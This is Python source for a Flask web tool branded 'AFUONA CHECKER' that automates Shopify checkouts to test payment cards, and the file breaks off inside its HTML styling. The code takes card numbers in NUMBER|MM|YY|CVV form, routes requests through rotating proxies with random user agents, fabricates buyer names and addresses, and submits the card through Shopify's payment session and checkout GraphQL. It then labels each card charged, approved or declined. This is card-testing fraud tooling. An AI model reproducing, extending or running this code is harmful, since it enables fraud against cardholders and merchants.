# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
import os
import re
import json
import time
import random
import asyncio
import uuid
import logging
from datetime import datetime
from collections import deque
from typing import Dict, List, Tuple, Optional
from urllib.parse import urlparse, quote

from flask import Flask, jsonify, request, render_template_string
import httpx
from fake_useragent import UserAgent

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

API_KEY = "afuona_2026"
PORT = int(os.environ.get('PORT', 8000))


def parse_proxy_ultimate(proxy_str: str) -> Optional[str]:
    """
    Advanced proxy parser supporting all formats.
    
    Supported formats:
    - http://user:pass@host:port
    - https://host:port
    - socks5://user:pass@host:port
    - host:port:user:pass (BrightData format)
    - host:port (simple format)
    """
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    proxy_type = 'http'
    
    # Detect proxy type from protocol
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy_str = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔    
    # Format: username:password@host:port
    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if match:
        username, password, host, port = match.groups()
    # Format: host:port:username:password (BrightData)
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str):
        host, port, username, password = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str).groups()
    # Format: host:port only
    elif re.match(r'^([^:@]+):(\d+)$', proxy_str):
        host, port = re.match(r'^([^:@]+):(\d+)$', proxy_str).groups()
    else:
        logger.warning(f"Could not parse proxy format: {proxy_str[:50]}...")
        return None
    
    if not host or not port:
        return None
    
    # Build proxy URL
    if username and password:
        user_encoded = quote(username, safe='')
        pass_encoded = quote(password, safe='')
        if proxy_type in ['socks5', 'socks4']:
            return f'{proxy_type}://{user_encoded}:{pass_encoded}@{host}:{port}'
        else:
            return f'http://{user_encoded}:{pass_encoded}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            return f'{proxy_type}://{host}:{port}'
        else:
            return f'http://{host}:{port}'

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
def find_between(text: str, start: str, end: str) -> str:
    """Extract string between two markers"""
    try:
        return text.split(start)[1].split(end)[0]
    except:
        return ""

# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
async def with_retry(func, max_retries: int = 2, *args, **kwargs):
    """Execute async function with automatic retry on failure"""
    for attempt in range(max_retries):
        try:
            result = await func(*args, **kwargs)
            if result.get('status') not in ['error', 'unknown']:
                return result
            if attempt < max_retries - 1:
                wait_time = 2 ** attempt
                logger.warning(f"Retry {attempt+1}/{max_retries} after {wait_time}s")
                await asyncio.sleep(wait_time)
        except Exception as e:
            logger.error(f"Attempt {attempt+1} failed: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
    
    return {"status": "error", "message": "All retries failed", "price": None}


# Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
class ShopifyChecker:
    def __init__(self, proxy: str = None):
        self.ua = UserAgent()
        self.proxy = proxy
        self.last_price = None
    
    async def get_random_info(self) -> dict:
        """Generate random user information with phone number"""
        addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Bangor", "state": "ME", "zip": "04401"},
            {"add1": "321 Elm St", "city": "Portland", "state": "ME", "zip": "04103"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "ME", "zip": "04240"},
        ]
        addr = random.choice(addresses)
        
        first = random.choice(["John", "Emily", "Michael", "Jessica", "David", "Sarah", "James", "Lisa"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"])
        email = f"{first.lower()}.{last.lower()}{random.randint(1,999)}@gmail.com"
        
        
        valid_phones = ["2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999"]
        phone = random.choice(valid_phones)
        
        return {
            "first": first,
            "last": last,
            "email": email,
            "phone": phone,  
            "address": addr["add1"],
            "city": addr["city"],
            "state": addr["state"],
            "zip": addr["zip"]
        }
    # Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
    async def get_cheapest_product(self, session: httpx.AsyncClient, site: str) -> dict:
        """Get cheapest product with pagination"""
        all_variants = []
        
        urls_to_try = [
            f"{site}/products.json",
            f"{site}/collections/all/products.json"
        ]
        
        for base_url in urls_to_try:
            page = 1
            max_pages = 10
            
            while page <= max_pages:
                url = f"{base_url}?page={page}&limit=250"
                try:
                    response = await session.get(url)
                    if response.status_code != 200:
                        break
                    
                    data = response.json()
                    products = data.get('products', [])
                    
                    if not products:
                        break
                    
                    for product in products:
                        for variant in product.get('variants', []):
                            if variant.get('available', False):
                                try:
                                    price = float(variant.get('price', 100))
                                    all_variants.append({
                                        'id': str(variant['id']),
                                        'title': product.get('title', 'Product'),
                                        'price': str(int(price * 100)),
                                        'price_value': price
                                    })
                                except:
                                    pass
                    
                    if len(products) < 250:
                        break
                    page += 1
                except:
                    page += 1
                    continue
        
        if all_variants:
            all_variants.sort(key=lambda x: x['price_value'])
            cheapest = all_variants[0]
            del cheapest['price_value']
            price_dollars = float(cheapest['price']) / 100
            logger.info(f"Cheapest: {cheapest['title']} - ${price_dollars:.2f}")
            return cheapest
        
        return {'id': '39555780771934', 'title': 'Default Product', 'price': '100'}
    
    async def extract_checkout_tokens(self, html: str) -> dict:
        """Extract all necessary tokens from checkout page"""
        tokens = {}
        
        # Session token patterns 
        session_patterns = [
            r'session-token" content="([^"]+)"',
            r'"sessionToken":"([^"]+)"',
            r"'sessionToken':'([^']+)'",
            r'data-session-token="([^"]+)"',
        ]
        for pattern in session_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['session_token'] = match.group(1)
                break
        if 'session_token' not in tokens:
            tokens['session_token'] = ""
        
        # Queue token patterns 
        queue_patterns = [
            r'"queueToken":"([^"]+)"',
            r"'queueToken':'([^']+)'",
            r'queueToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'data-queue-token="([^"]+)"',
        ]
        for pattern in queue_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['queue_token'] = match.group(1)
                break
        if 'queue_token' not in tokens:
            tokens['queue_token'] = ""
        
        # Stable ID patterns
        stable_patterns = [
            r'stableId["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"stableId":"([^"]+)"',
        ]
        for pattern in stable_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['stable_id'] = match.group(1)
                break
        if 'stable_id' not in tokens:
            tokens['stable_id'] = ""
        
        # Payment ID patterns
        payment_patterns = [
            r'paymentMethodIdentifier["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"paymentMethodIdentifier":"([^"]+)"',
        ]
        for pattern in payment_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['payment_id'] = match.group(1)
                break
        if 'payment_id' not in tokens:
            tokens['payment_id'] = ""
        
        
        total_patterns = [
            r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*"(\d+)"',
            r'"totalPrice"\s*:\s*"(\d+)"',
            r'total_price["\s:]+(\d+)',
            r'data-total-price="(\d+)"',
        ]
        tokens['updated_total'] = ""
        for pattern in total_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['updated_total'] = match.group(1)
                logger.info(f"Total: ${int(tokens['updated_total'])/100:.2f}")
                break
        
        return tokens
    # Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
    async def process_card(self, site: str, card: str) -> dict:
        """Main card processing function"""
        start_time = time.time()
        
        try:
            # Parse card
            parts = card.split('|')
            if len(parts) != 4:
                return {"status": "error", "message": "Invalid card format. Use: NUMBER|MM|YY|CVV", "price": None}
            
            cc_num, month, year, cvv = parts
            
            # Fix year format
            if len(year) == 4:
                year = year[2:]
            
            # Check for expired card
            from datetime import datetime
            now = datetime.now()
            exp_year = int(year)
            if exp_year < 100:
                exp_year += 2000
            exp_month = int(month)
            if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
                return {"status": "declined", "message": f"Card DECLINED - Expired ({month}/{year})", "price": None}
            
            # Setup client
            client_kwargs = {
                'timeout': 45.0,
                'follow_redirects': True,
                'verify': False,
                'headers': {'User-Agent': self.ua.random}
            }
            if self.proxy:
                parsed = parse_proxy_ultimate(self.proxy)
                if parsed:
                    client_kwargs['proxy'] = parsed
                    logger.debug(f"Using proxy: {parsed[:50]}...")
            
            async with httpx.AsyncClient(**client_kwargs) as session:
                
                # Get product
                product = await self.get_cheapest_product(session, site)
                self.last_price = product['price']
                price_dollars = float(product['price']) / 100
                logger.info(f"Product: {product['title']} - ${price_dollars:.2f}")
                
                # Add to cart
                resp = await session.post(
                    f"{site}/cart/add.js",
                    data={'id': product['id'], 'quantity': 1},
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                if resp.status_code not in [200, 201, 302]:
                    return {"status": "error", "message": f"Failed to add to cart: {resp.status_code}", "price": product['price']}
                
                # Get cart
                resp = await session.get(f"{site}/cart.js")
                if resp.status_code != 200:
                    return {"status": "error", "message": "Failed to get cart", "price": product['price']}
                
                cart = resp.json()
                cart_token = cart.get('token')
                
                # Access checkout
                resp = await session.get(f"{site}/checkout")
                if resp.status_code != 200:
                    return {"status": "error", "message": "Failed to access checkout", "price": product['price']}
                
                # Extract tokens
                tokens = await self.extract_checkout_tokens(resp.text)
                
                if not tokens.get('session_token'):
                    return {"status": "error", "message": "Could not extract session token", "price": product['price']}
                
                # Get user info
                user = await self.get_random_info()
                
                # Create payment session
                payment_data = {
                    'credit_card': {
                        'number': cc_num,
                        'month': month,
                        'year': year,
                        'verification_value': cvv,
                        'name': f"{user['first']} {user['last']}"
                    },
                    'payment_session_scope': urlparse(site).netloc
                }
                
                resp = await session.post(
                    'https://deposit.us.shopifycs.com/sessions',
                    json=payment_data,
                    headers={'Content-Type': 'application/json'}
                )
                
                if resp.status_code != 200:
                    return {"status": "declined", "message": "Card DECLINED - Payment session failed", "price": product['price']}
                
                payment_session = resp.json()
                session_id = payment_session.get('id')
                
                if not session_id:
                    error = payment_session.get('error', {}).get('message', 'Unknown error')
                    if 'declined' in error.lower() or 'insufficient' in error.lower():
                        return {"status": "declined", "message": f"Card DECLINED - {error}", "price": product['price']}
                    return {"status": "declined", "message": "Card DECLINED", "price": product['price']}
                
                logger.debug(f"Payment session created: {session_id}")
                
                # Final price (use updated_total if available)
                final_price = tokens.get('updated_total') or product['price']
                
                # GraphQL mutation
                graphql_url = f"{site}/checkouts/unstable/graphql"
                
                graphql_payload = {
                    'operationName': 'SubmitForCompletion',
                    'query': '''
                        mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
                            submitForCompletion(input: $input, attemptToken: $attemptToken) {
                                __typename
                                ... on SubmitSuccess {
                                    receipt {
                                        id
                                        token
                                    }
                                }
                                ... on SubmitFailed {
                                    reason
                                }
                                ... on Throttled {
                                    pollAfter
                                    queueToken
                                }
                            }
                        }
                    ''',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': tokens['session_token']},
                            'queueToken': tokens.get('queue_token'),
                            'delivery': {
                                'deliveryLines': [{
                                    'targetMerchandiseLines': {
                                        'lines': [{'stableId': tokens.get('stable_id')}]
                                    },
                                    'destination': {
                                        'streetAddress': {
                                            'address1': user['address'],
                                            'city': user['city'],
                                            'countryCode': 'US',
                                            'postalCode': user['zip'],
                                            'firstName': user['first'],
                                            'lastName': user['last'],
                                            'phone': user['phone']  
                                        }
                                    }
                                }]
                            },
                            'payment': {
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': tokens.get('payment_id'),
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': user['address'],
                                                    'city': user['city'],
                                                    'countryCode': 'US',
                                                    'postalCode': user['zip'],
                                                    'firstName': user['first'],
                                                    'lastName': user['last'],
                                                    'phone': user['phone']  
                                                }
                                            }
                                        }
                                    }
                                }]
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US'
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {'value': user['email']}
                                }
                            }
                        },
                        'attemptToken': f"{cart_token}-{random.random()}"
                    }
                }
                
                headers = {
                    'User-Agent': self.ua.random,
                    'X-Checkout-One-Session-Token': tokens['session_token'],
                    'Content-Type': 'application/json'
                }
                
                resp = await session.post(graphql_url, json=graphql_payload, headers=headers)
                
                if resp.status_code != 200:
                    return {"status": "error", "message": "GraphQL request failed", "price": final_price}
                
                result = resp.json()
                
                # Check result
                if 'data' in result and result['data'].get('submitForCompletion'):
                    completion = result['data']['submitForCompletion']
                    
                    if completion.get('__typename') == 'SubmitSuccess':
                        receipt = completion.get('receipt', {})
                        receipt_id = receipt.get('id')
                        
                        #
                        if receipt_id:
                            logger.info(f"Polling for receipt: {receipt_id}")
                            
                            poll_payload = {
                                'query': '''
                                    query PollForReceipt($receiptId:ID!,$sessionToken:String!){
                                        receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){
                                            __typename
                                            ... on ProcessedReceipt{id token orderIdentity{id}}
                                            ... on ProcessingReceipt{id pollDelay}
                                            ... on ActionRequiredReceipt{id}
                                            ... on FailedReceipt{id processingError{code messageUntranslated}}
                                        }
                                    }
                                ''',
                                'variables': {'receiptId': receipt_id, 'sessionToken': tokens['session_token']}
                            }
                            
                            for poll_attempt in range(7):
                                await asyncio.sleep(2.5)
                                logger.info(f"Poll attempt {poll_attempt + 1}/7")
                                
                                poll_resp = await session.post(graphql_url, json=poll_payload, headers=headers)
                                
                                if poll_resp.status_code == 200:
                                    poll_data = poll_resp.json()
                                    if 'data' in poll_data and poll_data['data'].get('receipt'):
                                        receipt_data = poll_data['data']['receipt']
                                        
                                        if receipt_data.get('__typename') == 'ProcessedReceipt':
                                            order_id = receipt_data.get('orderIdentity', {}).get('id', 'N/A')
                                            return {"status": "charged", "message": f"CHARGED! Order: {order_id}", "price": final_price}
                                        
                                        elif receipt_data.get('__typename') == 'FailedReceipt':
                                            error = receipt_data.get('processingError', {})
                                            error_code = error.get('code', 'Unknown')
                                            if error_code == 'INSUFFICIENT_FUNDS':
                                                return {"status": "approved", "message": "APPROVED - Insufficient Funds", "price": final_price}
                                            elif error_code == 'INCORRECT_CVC':
                                                return {"status": "approved", "message": "APPROVED - Invalid CVV", "price": final_price}
                                            else:
                                                return {"status": "declined", "message": f"DECLINED - {error_code}", "price": final_price}
                            
                            return {"status": "approved", "message": "APPROVED - Processing", "price": final_price}
                        
                        order_id = receipt.get('token', 'N/A')
                        return {"status": "charged", "message": f"CHARGED! Order: {order_id}", "price": final_price}
                    
                    elif completion.get('__typename') == 'Throttled':
                        return {"status": "approved", "message": "APPROVED - Processing", "price": final_price}
                    
                    elif completion.get('__typename') == 'SubmitFailed':
                        reason = completion.get('reason', 'Unknown')
                        if 'declined' in reason.lower():
                            return {"status": "declined", "message": "DECLINED", "price": final_price}
                        return {"status": "declined", "message": f"DECLINED - {reason}", "price": final_price}
                
                # Check final page for result
                checkout_url_final = f"{site}/checkout?from_processing_page=1&validate=true"
                final_response = await session.get(checkout_url_final, follow_redirects=True)
                final_text = final_response.text.lower()
                final_url = str(final_response.url)
                
                if "captcha" in final_text or "challenge" in final_url:
                    return {"status": "error", "message": "CAPTCHA required - Site protected", "price": final_price}
                
                if "thank you" in final_text or "order confirmed" in final_text:
                    return {"status": "charged", "message": "CHARGED! Order confirmed", "price": final_price}
                elif "insufficient funds" in final_text:
                    return {"status": "approved", "message": "APPROVED - Insufficient funds", "price": final_price}
                elif "card was declined" in final_text:
                    return {"status": "declined", "message": "DECLINED", "price": final_price}
                
                response_time = round(time.time() - start_time, 2)
                logger.info(f"Completed in {response_time}s - Status: {result.get('status', 'unknown')}")
                
                return {"status": "unknown", "message": "UNKNOWN RESPONSE", "price": final_price}
                
        except Exception as e:
            logger.error(f"Process error: {e}")
            return {"status": "error", "message": f"Error: {str(e)[:100]}", "price": None}


## Shopify api source code 
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>AFUONA CHECKER | Advanced Payment Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Space Grotesk', sans-serif;
            background: #0a0a0f;
            color: #fff;
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
        }
        
        .cyber-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255,107,77,0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,107,77,0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            animation: gridMove 20s linear infinite;
        }
        
        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }
        
        .neon-circle {
            position: fixed;
            width: min(300px, 50vw);
            height: min(300px, 50vw);
            border-radius: 50%;
            background: radial-gradient(circle at center, rgba(255,107,77,0.15), transparent 70%);
            top: -150px;
            right: -150px;
            z-index: -1;
            filter: blur(60px);
        }
        
        .neon-circle-2 {
            position: fixed;
            width: min(400px, 70vw);
            height: min(400px, 70vw);
            border-radius: 50%;
            background: radial-gradient(circle at center, rgba(255,107,77,0.1), transparent 70%);
            bottom: -200px;
            left: -200px;
            z-index: -1;
            filter: blur(80px);
        }
        
        .container {
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            padding: clamp(10px, 3vw, 20px);
            position: relative;
            z-index: 10;
        }
        
        .cyber-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: clamp(20px, 4vw, 30px) 0;
            border-bottom: 1px solid rgba(255,107,77,0.3);
            margin-bottom: clamp(20px, 4vw, 40px);
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: clamp(10px, 2vw, 15px);
            flex-wrap: wrap;
        }
        
        .logo-glow {
            font-size: clamp(1.8rem, 6vw, 2.8rem);
            font-weight: 700;
            background: linear-gradient(45deg, #ff6b4d, #ff3333);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(255,107,77,0.5);
            letter-spacing: 2px;
        }
        
        .badge-neon {
            background: rgba(255,107,77,0.1);
            border: 1px solid #ff6b4d;
            color: #ff6b4d;
            padding: clamp(3px, 1vw, 5px) clamp(10px, 2vw, 15px);
            border-radius: 30px;
            font-size: clamp(0.7rem, 2vw, 0.8rem);
            font-weight: 600;
            letter-spacing: 1px;
        }
        
        .status-panel {
            display: flex;
            gap: clamp(10px, 2vw, 20px);
            background: rgba(10, 10, 20, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,107,77,0.2);
            border-radius: 50px;
            padding: clamp(8px, 2vw, 12px) clamp(15px, 3vw, 25px);
            flex-wrap: wrap;
        }
        
        .status-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: clamp(0.8rem, 2vw, 0.9rem);
        }
        
        .status-dot {
            width: clamp(8px, 2vw, 10px);
            height: clamp(8px, 2vw, 10px);
            border-radius: 50%;
            background: #00ff00;
            box-shadow: 0 0 15px #00ff00;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .cyber-tabs {
            display: flex;
            gap: 5px;
            background: rgba(20, 20, 30, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,107,77,0.1);
            border-radius: 15px;
            padding: 5px;
            margin-bottom: clamp(20px, 4vw, 40px);
            flex-wrap: wrap;
        }
        
        .cyber-tab {
            flex: 1 1 auto;
            min-width: 120px;
            padding: clamp(10px, 2vw, 15px);
            text-align: center;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
            color: #888;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: clamp(0.8rem, 2vw, 1rem);
        }
        
        .cyber-tab i {
            font-size: clamp(1rem, 2.5vw, 1.2rem);
        }
        
        .cyber-tab.active {
            background: linear-gradient(135deg, #ff6b4d, #ff3333);
            color: #0a0a0f;
            box-shadow: 0 10px 30px rgba(255,107,77,0.3);
        }
        
        .nova-card {
            background: rgba(15, 15, 25, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,107,77,0.2);
            border-radius: clamp(20px, 4vw, 30px);
            padding: clamp(20px, 4vw, 40px);
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }
        
        .nova-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,107,77,0.1), transparent);
            transition: 0.8s;
        }
        
        .nova-card:hover::before {
            left: 100%;
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: clamp(20px, 3vw, 30px);
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .card-header h3 {
            font-size: clamp(1.2rem, 4vw, 1.8rem);
            font-weight: 600;
            background: linear-gradient(135deg, #fff, #ff6b4d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .card-badge {
            background: rgba(255,107,77,0.2);
            border: 1px solid #ff6b4d;
            color: #ff6b4d;
            padding: clamp(5px, 1.5vw, 8px) clamp(15px, 3vw, 20px);
            border-radius: 30px;
            font-size: clamp(0.8rem, 2vw, 0.9rem);
        }
        
        .cyber-input-group {
            margin-bottom: clamp(15px, 3vw, 25px);
        }
        
        .cyber-input-group label {
            display: block;
            margin-bottom: 10px;
            color: #ff6b4d;
            font-weight: 500;
            letter-spacing: 1px;
            font-size: clamp(0.8rem, 2vw, 0.9rem);
        }
        
        .cyber-input {
            width: 100%;
            padding: clamp(12px, 2.5vw, 18px) clamp(15px, 3vw, 20px);
            background: rgba(10, 10, 20, 0.6);
            border: 1px solid rgba(255,107,77,0.3);
            border-radius: 15px;
            color: #fff;
            font-family: 'Space Grotesk', monospace;
            font-size: clamp(0.9rem, 2vw, 1rem);
            transition: all 0.3s;
        }
        
        .cyber-input:focus {
            outline: none;
            border-color: #ff6b4d;
            box-shadow: 0 0 30px rgba(255,107,77,0.2);
            background: rgba(20, 20, 30, 0.8);
        }
        
        .cyber-textarea {
            min-height: 150px;
            resize: vertical;
        }
        
        .cyber-btn {
            padding: clamp(12px, 2.5vw, 16px) clamp(20px, 4vw, 35px);
            border: none;
            border-radius: 15px;
            font-weight: 600;
            font-size: clamp(0.9rem, 2vw, 1rem);
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Space Grotesk', sans-serif;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: fit-content;
        }
        
        .cyber-btn-primary {
            background: linear-gradient(135deg, #ff6b4d, #ff3333);
            color: #0a0a0f;
            box-shadow: 0 10px 30px rgba(255,107,77,0.3);
        }
        
        .cyber-btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(255,107,77,0.4);
        }
        
        .cyber-btn-secondary {
            background: transparent;
            border: 1px solid #ff6b4d;
            color: #ff6b4d;
        }
        
        .cyber-btn-secondary:hover {
            background: rgba(255,107,77,0.1);
        }
        
        .cyber-btn-danger {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #ff0000;
            color: #ff0000;
        }
        
        .cyber-btn-danger:hover {
            background: rgba(255, 0, 0, 0.3);
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        /* Toggle Switch */
        .toggle-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
            padding: 8px 12px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
        }
        
        .toggle-switch {
            position: relative;
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }
        
        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .toggle-slider {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
            background-color: #333;
            border-radius: 34px;
            transition: 0.3s;
            cursor: pointer;
        }
        
        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            border-radius: 50%;
            transition: 0.3s;
        }
        
        input:checked + .toggle-slider {
            background-color: #ff6b4d;
        }
        
        input:checked + .toggle-slider:before {
            transform: translateX(26px);
        }
        
        .toggle-label {
            font-size: 0.75rem;
            color: #aaa;
        }
        
        .toggle-label.active {
            color: #ff6b4d;
        }
        
        .proxy-warning {
            font-size: 0.7rem;
            color: #ff0000;
            display: none;
        }
        
        .proxy-warning.show {
            display: block;
        }
        
        .proxy-panel {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 20px;
            padding: clamp(15px, 3vw, 25px);
            margin: 20px 0;
            border: 1px solid rgba(255,107,77,0.2);
        }
        
        .proxy-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: clamp(10px, 2vw, 20px);
            margin: 20px 0;
        }
        
        .proxy-stat {
            background: rgba(10, 10, 20, 0.6);
            border-radius: 15px;
            padding: clamp(12px, 2.5vw, 20px);
            text-align: center;
            border: 1px solid rgba(255,107,77,0.2);
        }
        
        .proxy-stat-value {
            font-size: clamp(1.2rem, 4vw, 2rem);
            font-weight: 700;
            color: #ff6b4d;
            margin-bottom: 5px;
        }
        
        .proxy-stat-label {
            color: #888;
            font-size: clamp(0.7rem, 1.8vw, 0.9rem);
        }
        
        .proxy-list {
            max-height: 200px;
            overflow-y: auto;
            margin: 15px 0;
        }
        
        .proxy-item {
            background: rgba(255,107,77,0.1);
            border: 1px solid rgba(255,107,77,0.2);
            border-radius: 10px;
            padding: 12px 15px;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            font-size: clamp(0.8rem, 2vw, 0.9rem);
        }
        
        .proxy-item.working {
            border-left: 5px solid #00ff00;
        }
        
        .proxy-item.dead {
            border-left: 5px solid #ff0000;
            opacity: 0.5;
        }
        
        .proxy-status-badge {
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }
        
        .badge-working {
            background: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 1px solid #00ff00;
        }
        
        .badge-dead {
            background: rgba(255, 0, 0, 0.2);
            color: #ff0000;
            border: 1px solid #ff0000;
        }
        
        .status-message {
            background: rgba(255,107,77,0.1);
            border: 1px solid #ff6b4d;
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            text-align: center;
            color: #ff6b4d;
            font-size: clamp(0.8rem, 2vw, 0.9rem);
        }
        
        .status-message.error {
            background: rgba(255, 0, 0, 0.1);
            border-color: #ff0000;
            color: #ff0000;
        }
        
        .status-message.success {
            background: rgba(0, 255, 0, 0.1);
            border-color: #00ff00;
            color: #00ff00;
        }
        
        .telegram-float {
            position: fixed;
            bottom: 30px;
            right: 30px;
            z-index: 1000;
        }
        
        .telegram-float a {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 58px;
            height: 58px;
            background: rgba(255,107,77,0.15);
            border: 2px solid #ff6b4d;
            border-radius: 50%;
            color: #ff6b4d;
            font-size: 30px;
            transition: all 0.3s ease;
            text-decoration: none;
            backdrop-filter: blur(5px);
            box-shadow: 0 4px 15px rgba(255,107,77,0.3);
        }
        
        .telegram-float a:hover {
            background: #ff6b4d;
            color: #0a0a0f;
            transform: scale(1.1);
            box-shadow: 0 0 25px rgba(255,107,77,0.6);
        }
        
        .cyber-footer {
            margin-top: 50px;
            padding: 30px 0;
            border-top: 1px solid rgba(255,107,77,0.2);
            text-align: center;
            color: #666;
            font-size: clamp(0.7rem, 2vw, 0.9rem);
        }
        
        /* ==================== أنماط المربعات ==================== */
        .results-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-top: 30px;
        }
        
        .result-box {
            background: rgba(10, 10, 20, 0.6);
            border-radius: 15px;
            border: 1px solid;
            overflow: hidden;
            width: 100%;
        }
        
        .result-box.approved-box {
            border-color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        
        .result-box.declined-box {
            border-color: #ff0000;
